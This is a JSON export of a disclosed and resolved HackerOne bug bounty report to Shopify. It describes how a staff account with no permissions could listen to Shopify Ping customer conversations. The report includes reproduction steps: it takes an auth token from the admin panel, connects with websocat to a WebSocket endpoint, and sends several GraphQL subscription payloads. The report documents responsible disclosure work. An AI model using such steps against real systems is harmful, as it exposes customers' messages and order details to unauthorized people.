{
  "id": 1023669,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIzNjY5",
  "url": "https://hackerone.com/reports/1023669",
  "title": "Staff with no permissions can listen to Shopify Ping conversations by registering to its different WebSocket Events",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2020-10-31T23:47:39.526Z",
  "submitted_at": "2020-10-31T23:47:39.541Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "imgnotfound",
    "url": "/imgnotfound",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/kfb97hnubizb8ot4cfd7ie8uhm7w/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-11-19T20:11:37.668Z",
  "bug_reporter_agreed_on_going_public_at": "2020-11-19T20:11:37.621Z",
  "team_member_agreed_on_going_public_at": "2020-11-19T19:02:11.819Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "By registering to a few different Shopify Ping Websocket Events on the `wss://argus.shopifycloud.com/graphql?shop_id={id}` endpoint, a staff without any permission can listen to conversions with customers.\n\n## Steps to reproduce\n1. With a staff that doesn't have any permissions, login into the shop admin at `https://{shop}.myshopify.com/admin`\n1. Within your browser, open the Network inspection tab and copy the **argus token** value from the response of the **GetToken** operation that is being sent to `https://{shop}.myshopify.com/admin/internal/web/graphql/core`\n1. Using **websocat** command line tool or any other WebSocket client:\n\nOpen a connection\n ```\nwebsocat \"wss://argus.shopifycloud.com/graphql?shop_id={id}\"\n ```\n\nSend the authorization request by taking care of replacing the `{token}` with the actual value from **Step 2**\n ```\n{\"type\":\"connection_init\",\"payload\":{\"Authorization\":\"{token}\"}}\n```\n\nRegister to different Events\n```\n{\"id\":\"1\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"conversation\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n\n```\n{\"id\":\"2\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"message_status\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n\n```\n{\"id\":\"3\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"message\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n\n```\n{\"id\":\"4\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"participant\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n```\n{\"id\":\"5\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"read_state\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n \n4.Using your browser in Incognito, create a new Shopify Chat discussion by opening `https://{shop}.myshopify.com/?chat` and proceed with a customer order lookup operation\n 5.In your command line, observe that you'll be receiving any messages from that conversion along with the customer order status page link\n\n## Demo\n███████\n\n## Impact\n\nA staff without any permissions can listen to ongoing Shopify Ping conversions and therefore get access to some customer details and order informations.",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 22,
  "voters": [
    "th3hidd3nmist",
    "xploiterr",
    "drsniper",
    "aphak5010",
    "th4nu_0x0",
    "ali",
    "mattberg",
    "h4x0r_dz",
    "yinvi777",
    "f0rtr3ss",
    "and 12 more..."
  ],
  "structured_scope": {
    "databaseId": 37198,
    "asset_type": "OTHER",
    "asset_identifier": "Shopify Developed Apps",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
